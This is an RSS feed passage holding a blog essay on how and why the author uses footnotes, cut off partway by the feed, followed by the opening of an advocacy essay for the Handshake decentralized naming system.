<p>I use footnotes<a href="#fn_end" name="ref_end">[1]</a> in my articles. I didn‚Äôt always use them<a href="#fn_practical" name="ref_practical">[2]</a>, but I started to do so more and more after about a year<a href="#fn_wallace" name="ref_wallace">[3]</a> into my blogging<a href="#fn_timeless" name="ref_timeless">[4]</a>. They have both benefits<a href="#fn_writing" name="ref_writing">[5]</a><a href="#fn_drama" name="ref_drama">[6]</a> and drawbacks<a href="#fn_easy" name="ref_easy">[7]</a>, but overall I think the benefits are greater ‚Äî as long as you don‚Äôt‚Ä¶ overdo it.</p>

<p>‚Ä¢ ‚Ä¢ ‚Ä¢</p>

<h4>Notes</h4>
<p><a href="#ref_end" name="fn_end">[1]</a><br>Or maybe they‚Äôre endnotes? The distinction disappears when the concept of the ‚Äúpage‚Äù becomes obsolete. Before getting a note routine down<a href="#fn_wallace" name="ref_wallace">[3]</a> I tried putting notes at the end of each section instead of the end of the post, which is more like traditional footnotes. It worked ok but it was interruptive<a href="#fn_otoh" name="ref_otoh">[8]</a> and depended on having short sections, almost like pages. In the end I think we‚Äôre more likely to keep the word ‚Äúfootnotes‚Äù than ‚Äúendnotes‚Äù because a web<em>page</em> feels like one big page.</p>
<p><a href="#ref_practical" name="fn_practical">[2]</a><br>I didn‚Äôt use notes in the beginning because there‚Äôs no native function in my wordpress editor for inserting and managing them. I have keep track and write the HTML code for them manually. I did work out a routine to do it with a minimum of hassle but it‚Äôs still a chore and I had to be convinced of their value to consider it worth doing<a href="#fn_wallace" name="ref_wallace">[3]</a>.</p>
<p><a href="#ref_wallace" name="fn_wallace">[3]</a><br>I became a footnote convert after reading David Foster Wallace‚Äôs essay <span><a href="https://en.wikipedia.org/wiki/A_Supposedly_Fun_Thing_I%27ll_Never_Do_Again" target="_blank" rel="noopener">A Supposedly Fun Thing I‚Äôll Never Do Again</a></span> in 2016. There and in his massive novel <em>Infinite Jest</em><a href="#fn_media" name="ref_media">[9]</a> he didn‚Äôt just use notes to add some extra information or clarification, he used them to construct separate strands of narrative, sometimes without which you couldn‚Äôt understand the story. He was a ‚Äúfootnote artist‚Äù if there ever was one.</p>
<p><a href="#ref_timeless" name="fn_timeless">[4]</a><br>This post took a long time from conception to execution. I had the idea for it just as I was getting into footnotes as a writing device<a href="#fn_wallace" name="ref_wallace">[3]</a> four years ago. <span><a href="https://everythingstudies.com/2019/10/30/cat-couplings/" target="_blank" rel="noopener">Cat couplings</a></span> was my previous record of taking a long time from start to finish;<a href="#fn_semi" name="ref_semi">[10]</a> I started that one back in 2015 before the blog even existed and didn‚Äôt go back to finish it until last year. Other posts spend a very short time on the shop floor<a href="#fn_short" name="ref_short">[11]</a><a href="#fn_started" name="ref_started">[12]</a>, often because I have to get something out while it‚Äôs still relevant. Maybe this one took so long because it‚Äôs timeless, and therefore easier to postpone.</p>
<p><a href="#ref_writing" name="fn_writing">[5]</a><br>Footnotes means you can cut your cake and keep it too, which takes a lot of pressure off when you lack perfect laser focus<a href="#fn_easy" name="ref_easy">[7]</a>. Ideally, a piece of writing has a point to make and gets there truly and cleanly, like this:</p>
<p><img loading="lazy" data-attachment-id="13665" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-straight/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png" data-orig-size="1116,268" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-straight" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656" alt="" width="656" height="158" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-straight.png 1116w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>It‚Äôs the most efficient way to write but you really must know exactly where you want to go and how to get there, right from the start<a href="#fn_bits" name="ref_bits">[13]</a>. You also need perfect discipline too keep your eyes on the target instead of enjoying the scenery too much, or you get this:</p>
<p><img loading="lazy" data-attachment-id="13664" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-meander1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png" data-orig-size="1160,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-meander1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656" alt="" width="656" height="271" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png 1160w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>I.e. you mess around developing parts in too much detail. ‚ÄúYeah, yeah I get it, you don‚Äôt need an example, personal story or lengthy explication here‚Äù, says the hypothetical reader and grows bored. Footnotes to the rescue!</p>
<p><img loading="lazy" data-attachment-id="13663" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-meander2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png" data-orig-size="1120,458" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-meander2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656" alt="" width="656" height="268" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png 1120w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>Better. The narrative is rescued and the writer gets to keep their little anecdotes and elaborations.</p>
<p>Or you might be the type that does a lot of free association and thus come up with tons of stuff to try bring into the central narrative: ‚Äúoh and btw I thought of this whichisalsorelevant‚Ä¶‚Äù<a href="#fn_tangent" name="ref_tangent">[14]</a>.</p>
<p><img loading="lazy" data-attachment-id="13662" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-tangents1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png" data-orig-size="1094,428" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-tangents1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656" alt="" width="656" height="257" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png 1094w" sizes="(max-width: 656px) 100vw, 656px">This easily becomes a hot mess, but with notes it turns into this:</p>
<p>Ah.<img loading="lazy" data-attachment-id="13661" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-tangents2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png" data-orig-size="1126,442" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-tangents2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656" alt="" width="656" height="258" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png 1126w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>So, footnotes are a coping mechanism for the less-than-perfectly competent and less-than-perfectly ruthless writer, and I love them for it.</p>
<p><a href="#ref_drama" name="fn_drama">[6]</a><br>Sometimes you want to end a post on a particular point where the narrative lands, and having more text after that (if you want to say more) ruins the mood. Luckily you can always turn any afterthought into a footnote and hide it away<a href="#fn_cut" name="ref_cut">[15]</a>.</p>
<p><a href="#ref_easy" name="fn_easy">[7]</a><br>Allowing yourself unlimited footnotes saves you from having to do the hard work to filter, prioritize, and order. Instead you push that job onto the reader, who has to go back and forth<a href="#fn_hypertext" name="ref_hypertext">[16]</a> to read unnecessary side stuff. It can be presumptous to expect readers to be interested in your beside-the-point-meanderings <a href="#fn_this" name="ref_this">[17]</a> instead of valuing the reader‚Äôs time by going straight for the point<a href="#fn_writerf" name="ref_writerf">[18]</a>.</p>
<p><a href="#ref_otoh" name="fn_otoh">[8]</a><br>On the other hand<a href="#fn_wild" name="ref_wild">[19]</a>, it‚Äôs <em>more</em> reader-friendly to put your digressions in footnotes than in the text itself. That way you make the extraneous stuff optional.</p>
<p><a href="#ref_media" name="fn_media">[9]</a><br>I‚Äôve read somewhere<a href="#fn_true" name="ref_true">[20]</a> that Wallace specifically told major parts of the story of <em>Infinite Jest</em><a href="#fn_ij" name="ref_ij">[21]</a> in endnotes<a href="#fn_hypertext" name="ref_hypertext">[16]</a>, sometimes many pages long, in order to simulate the fragmented attention<a href="#fn_links" name="ref_links">[22]</a> characteristic of modern media. If so, he was successful, imo.</p>
<p><a href="#ref_semi" name="fn_semi">[10]</a><br>I use semicolons a lot. I know it‚Äôs supposed to mark you as a pretentious blowhard but what can you do. I still want to do it<a href="#fn_dash" name="ref_dash">[23]</a>. I like them and I‚Äôm almost convinced I‚Äôm using them correctly most of the time.</p>
<p><a href="#ref_short" name="fn_short">[11]</a><br><span><a href="https://everythingstudies.com/2018/12/19/the-romeo-and-juliet-fallacy/" target="_blank" rel="noopener">The Romeo and Juliet Fallacy</a></span>, <span><a href="https://everythingstudies.com/2020/08/18/turnabout-trash/" target="_blank" rel="noopener">Turnabout Trash</a></span>, <span><a href="https://everythingstudies.com/2018/06/21/postmodernism-vs-the-pomoid-cluster/" target="_blank" rel="noopener">Postmodernism vs. the Pomoid Cluster</a></span>, <span><a href="https://everythingstudies.com/2020/02/17/picking-apart-eugenics/" target="_blank" rel="noopener">Picking Apart Eugenics</a></span>, <span><a href="https://everythingstudies.com/2020/01/28/its-not-so-only/" target="_blank" rel="noopener">It‚Äôs Not So Only</a></span>, <span><a href="https://everythingstudies.com/2017/06/20/rant-on-arrival/" target="_blank" rel="noopener">Rant on Arrival</a></span> and of course my most trivial <span><a href="https://everythingstudies.com/2017/10/18/signed-google-translate/" target="_blank" rel="noopener">Signed Google Translate</a></span> were all quick and straightforward to write. In contrast, <span><a href="https://everythingstudies.com/2018/04/26/a-deep-dive-into-the-harris-klein-controversy/" target="_blank" rel="noopener">A Deep Dive into the Harris-Klein Controversy</a></span>, <span><a href="https://everythingstudies.com/2018/11/16/anatomy-of-racism/" target="_blank" rel="noopener">Anatomy of Racism</a></span>, <span><a href="https://everythingstudies.com/2017/05/29/the-good-the-true-and-the-undefined/" target="_blank" rel="noopener">The True, The Good and the Undefined</a></span>, <span><a href="https://everythingstudies.com/2019/05/13/a-defense-of-erisology/" target="_blank" rel="noopener">A Defense of Erisology</a></span>, and all my book review posts took a whole lot of time, and effort to write, structure, re-structure and line edit. I think more effort translates into better posts on the whole, but the relationship isn‚Äôt perfect.</p>
<p><a href="#ref_started" name="fn_started">[12]</a><br>Once I started to write this it was easy and quick because of how modular it is<a href="#fn_paper" name="ref_paper">[24]</a><a href="#fn_work" name="ref_work">[25]</a><a href="#fn_tricky" name="ref_tricky">[26]</a>. I could just write and write, jot down any random shit<a href="#fn_tangent" name="ref_tangent">[14]</a> I could think of and attach it to whatever vaguely relevant. The format allows anything, even silly jokes<a href="#fn_self" name="ref_self">[27]</a>. Really, once you‚Äôre free from the constraint of having a point and being coherent past the paragraph level, writing is as easy as thinking<a href="#fn_book" name="ref_book">[28]</a>.</p>
<p><a href="#ref_bits" name="fn_bits">[13]</a><br>You don‚Äôt always start writing with a clear plan. As discussed <span><a href="https://everythingstudies.com/2020/05/22/leftovers-from-last-time/" target="_blank" rel="noopener">here</a></span>, my raw materials for a piece are often just a lump of interrelated thoughts and motifs. Most of my book reviews were easy to start and push to a decent word count because I just wrote down reactions as I read, which was easy because hey, the book itself had established a context<a href="#fn_tangent" name="ref_tangent">[14]</a>. The difficult part came later, when I had to massage it into something with a thesis.</p>
<p>This ‚Äúpatchwork‚Äù strategy of writing small parts spontaneously and putting them together into a narrative arc later is one out of three main writing strategies<a href="#fn_music" name="ref_music">[29]</a>.&nbsp;</p>
<p><img loading="lazy" data-attachment-id="13660" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png" data-orig-size="446,642" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=208" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=446" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png" alt="" width="446" height="642" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png 446w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=104&amp;h=150 104w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=208&amp;h=300 208w" sizes="(max-width: 446px) 100vw, 446px"></p>
<p>Another one is to make a rough outline and then elaborate each part.</p>
<p><img loading="lazy" data-attachment-id="13659" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png" data-orig-size="448,668" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=201" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=448" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png" alt="" width="448" height="668" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png 448w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=101&amp;h=150 101w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=201&amp;h=300 201w" sizes="(max-width: 448px) 100vw, 448px"></p>
<p>You need to know where you want to end up and how to get there. If what you‚Äôre trying to say is complex and difficult in ways that won‚Äôt reveal themselves fully before you write it all out, you‚Äôre in for a world of hurt with this technique.</p>
<p>Finally, you can just write it straight through from start to finish, seeing where inspiration takes you.</p>
<p><img loading="lazy" data-attachment-id="13658" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat3/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png" data-orig-size="450,606" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat3" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=223" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=450" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png" alt="" width="450" height="606" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png 450w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=111&amp;h=150 111w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=223&amp;h=300 223w" sizes="(max-width: 450px) 100vw, 450px"></p>
<p>This is great for exploratory writing, and if you‚Äôre good at this you can be an incredibly productive writer. If you‚Äôre <em>not</em> good at it, if you have trouble keeping your explorations focused ‚Äî like me ‚Äî you risk starting with a lot of enthusiasm and just run off into the wild, get lost and bogged down, and lose interest.</p>
<p>Which is best? Nobody knows and writers have different tastes. For me it depends on the topic and my relationship to it. This footnote piece was perfect for the last(ish) strategy because it allowed me to just write and write without having to keep things on track or come to a natural close. For once that was actually ok.</p>
<p><a href="#ref_tangent" name="fn_tangent">[14]</a><br>I find it hard to write without an established context because I have little trust in my ability to communicate ideas without a lot of introductory groundwork. I feel I need to clue the reader into the entirety of my personal background with the idea I‚Äôm about to discuss in order to communicate it accurately. So, I‚Äôm often tempted to put a random thought as a footnote rather than as a post of its own because that way there‚Äôs already a context and background for that thought and I don‚Äôt need to bootstrap one all over again. It‚Äôs a way to get a thought out of your system when you just know you won‚Äôt prioritize developing it properly later<a href="#fn_perfect" name="ref_perfect">[30]</a>.</p>
<p><a href="#ref_cut" name="fn_cut">[15]</a><br>This is a weak thought that I probably should have cut, but at the stage in the writing process where I first wrote it I had the idea that more, messier and tanglier is better for this particular post and thus I should throw in everything I had<a href="#fn_perv" name="ref_perv">[31]</a>. In retrospect I doubt that was a good idea and ditched some things ‚Äî but I still kept this one since it allowed me to write <em>this</em> note.</p>
<p><a href="#ref_hypertext" name="fn_hypertext">[16]</a><br>In other words: <em>hypertext</em>, all the rage in the 90s after the invention of the WWW and the hyperlink. Think of the possibilities! It remains unpopular as an essay/book genre because of how difficult it is to navigate and how unclear the upside is.</p>
<p><a href="#ref_this" name="fn_this">[17]</a><br>This post is me experimenting with form<a href="#fn_meditation" name="ref_meditation">[32]</a> and free association, mostly to entertain myself. It‚Äôs self-absorbed and not reader-friendly<a href="#fn_para" name="ref_para">[33]</a>, and I don‚Äôt expect it to be a ‚Äúhit‚Äù<a href="#fn_told" name="ref_told">[34]</a>. You might call it‚Ä¶ anti-viral.</p>
<p><a href="#ref_writerf" name="fn_writerf">[18]</a><br>It‚Äôs writer-focused writing, as opposed to reader-focused writing<a href="#fn_creatives" name="ref_creatives">[35]</a><a href="#fn_para" name="ref_para">[33]</a>, and there‚Äôs only so much of it you can do before it becomes obnoxious. I‚Äôll dial back on it after this post<a href="#fn_promise" name="ref_promise">[36]</a>.</p>
<p><a href="#ref_wild" name="fn_wild">[19]</a><br>I‚Äôm allowing my ‚Äúon the other hand‚Äù tendencies to run wild. I doubt it improves my writing. On the other hand‚Ä¶<a href="#fn_this" name="ref_this">[17]</a></p>
<p><a href="#ref_true" name="fn_true">[20]</a><br>That means it‚Äôs true.</p>
<p><a href="#ref_ij" name="fn_ij">[21]</a><br>Much of what I‚Äôve read recently that perhaps qualifies as ‚Äúserious literature‚Äù (I‚Äôm thinking of <em>Infinite Jest</em>, <em>The Gold Bug Variations</em>, <em>Foucault‚Äôs Pendulum</em> and <em>The Glass Bead Game</em>) have something in common: I enjoy thinking about them afterwards a lot more than I enjoyed reading them. <span><a href="https://everythingstudies.com/2017/04/06/reactions-to-infinite-jest/" target="_blank" rel="noopener">My review of Infinite Jest</a></span> was quite negative but now I look back fondly on it<a href="#fn_predicted" name="ref_predicted">[37]</a>. I wonder why this pattern exists. Do books have to be a chore to read to have complex, rewarding ideas<a href="#fn_difficulty" name="ref_difficulty">[38]</a>? I really don‚Äôt see why<a href="#fn_hitchhiker" name="ref_hitchhiker">[39]</a>, and can‚Äôt help thinking that only books that are off-putting to casual readers earn the ‚Äúserious literature‚Äù label because status is based on differentiation and exclusion. To be ‚Äúworthy‚Äù it <em>must</em> be disliked by the plebs. How else will liking it mark me as a member of an elite?</p>
<p><a href="#ref_links" name="fn_links">[22]</a><br>There‚Äôs an ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://everythingstudies.com/2020/09/24/notes-on-notes/">https://everythingstudies.com/2020/09/24/notes-on-notes/</a></em></p>]]>
            </description>
            <link>https://everythingstudies.com/2020/09/24/notes-on-notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579351</guid>
            <pubDate>Thu, 24 Sep 2020 15:12:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handshake ‚Äì A Namespace for the Decentralized Web]]>
            </title>
            <description>
<![CDATA[
Score 146 | Comments 86 (<a href="https://news.ycombinator.com/item?id=24579284">thread link</a>) | @rasengan
<br/>
September 24, 2020 | https://meowis.ms/handshake.html | <a href="https://web.archive.org/web/*/https://meowis.ms/handshake.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a href="https://meowis.ms/"> &lt; </a>




<!-- <div class="subtitle"></div> -->

<p>Names are fundamental to human existence and how we relate to everything in the world. At the heart of all interactions lies the ability for all the parties to match names to the respective entities they stand for.</p>

<p>Names are so integral to the human experience that a strong argument can be made that if <em>something doesn√¢‚Ç¨‚Ñ¢t have a name, it does not exist.</em></p>

<p>Correspondingly, names on the internet are critical to our online existence. Users, apps, or machines locate a resource on the internet via its name. The name needs to not only be understood by humans but also needs to be uniquely identifiable by machines amongst the billions of potential destinations.</p>

<p>Given that the act of matching a name to the eventual resource is the starting point of trillions of internet transactions that happen daily,  it is no surprise that out of the three core layers of internet stack - naming (DNS), transportation (TCP/IP) and application (HTTP), naming is at the very start of the stack.</p>

<p>Naming needs a single source of truth as the names within the namespaces have to be unique across the whole system. Hence, an effective naming system cannot merely be a standard or a protocol, it has to meet all the other aspects of running an internet-scale namespace - including enforcement of unique names, the management of the naming records, scaling to internet traffic, while remaining fully accessible to anyone, anywhere.</p>

<h2 id="namespaces">Namespaces</h2>

<p>Names are the most valuable assets on the internet, but we don√¢‚Ç¨‚Ñ¢t own our own names. All of the crucial namespaces belong to centralized entities who control the namespaces and take that control away from you. This is true for all significant namespaces today - the ICANN namespace, Facebook, Twitter, and Google.</p>

<p>As a result, your name on the internet does not belong to you, but rather to the owners of these centralized namespaces.  With a stroke of the keyboard, they can remove anyone from existence.  If your name lives on a centralized namespace, your right to exist effectively belongs to someone else.</p>

<p>Centralized namespaces also determine much more than a user√¢‚Ç¨‚Ñ¢s ability to exist. They also decree a user√¢‚Ç¨‚Ñ¢s ability to search, match, and communicate with others. They unilaterally set the framework for what protocols can be used, which use cases are permitted, and what information can flow.</p>

<p>The power to enforce monopolies with little consequence also makes these centralized namespaces some of the most valuable properties on the internet today. Verisign makes billions a year controlling .com with practically zero innovation, while ICANN has the power to arbitrarily raise price caps of entire TLDs with their pet cartel companies. Facebook and Twitter controls exactly how users can use their names/accounts, and can heedlessly cancel pages and remove identities for barely specified reasons.</p>

<p>Everywhere we see, we are seeing the serious dangers of depending on centralized entities to exist and be found by others. The Internet is supposed to be kingless, but the ability to strike away one√¢‚Ç¨‚Ñ¢s existence and control exactly how the name is to be used makes the owners of these namespaces the de-facto kings/governors of the internet.</p>

<h2 id="the-world-needs-a-decentralized-namespace">The World Needs a Decentralized Namespace</h2>

<p>Of course, the ability of these centralized namespace owners to control digital existence, lockout access, and enforce monopolistic economics is the complete opposite goal of the decentralized web, which is the ability to exist, innovate, and create their own business models without the need for centralized control or systems.</p>

<p>Whether it√¢‚Ç¨‚Ñ¢s decentralized currencies, decentralized file systems, or decentralized servers - if these decentralized entities do not live on a widely used namespace, they simply do not exist to the vast majority of users on the internet.</p>

<p><em>Without a decentralized namespace widely readable by humans and resolvable by machines, it is impossible for the decentralized world to be widely adopted by users</em>.</p>

<p><strong>Criteria for a Decentralized Naming System</strong></p>

<p>Naming systems play a crucial role in discovery, connection and identification. As one of the most fundamental and long-lasting components of the internet backbone infrastructure, the bar needs to be set very high in terms of longevity, stability, and technical scalability.</p>

<p>For a decentralized naming system to become the legitimate namespace for the decentralized world, the bar is even higher. Without a centralized body in charge, the world has to trust that this naming system will exist in a stable state for a long time to come and stay relevant regardless of potential upheavals and technological progress.</p>

<p>As such, this naming system√¢‚Ç¨‚Ñ¢s fundamental construction needs to have certain key technical, social, and governance requirements:</p>

<ol>
  <li><strong>Be truly decentralized</strong>: what is the point of a decentralized naming system if it remains controlled by a small set of people?</li>
  <li><strong>Main key focus as a naming system</strong>: naming systems need to be extremely focused and fast. Can you imagine the DNS system operating reliably if it was also designed for delivering 4K video?</li>
  <li><strong>Be as accessible yet trustless as possible</strong>: anyone should be able to access the namespace directly in a fully trustless manner without intensive resources</li>
  <li><strong>Compatible with the rest of the internet</strong>: allowing for seamless usage with the rest of the application, user, and technical stack</li>
  <li><strong>Stability and upgradability at the protocol level</strong>: allowing for innovation moving forward without disrupting regular operations</li>
</ol>

<h2 id="handshake-design">Handshake Design</h2>

<p>Given these objectives, and with the general goal of the decentralized root zone and certificate authority, Handshake is the only naming system that is fundamentally suitable to be the namespace for decentralized web.</p>

<h3 id="1-focus-as-a-naming-system">1. Focus as a Naming System</h3>

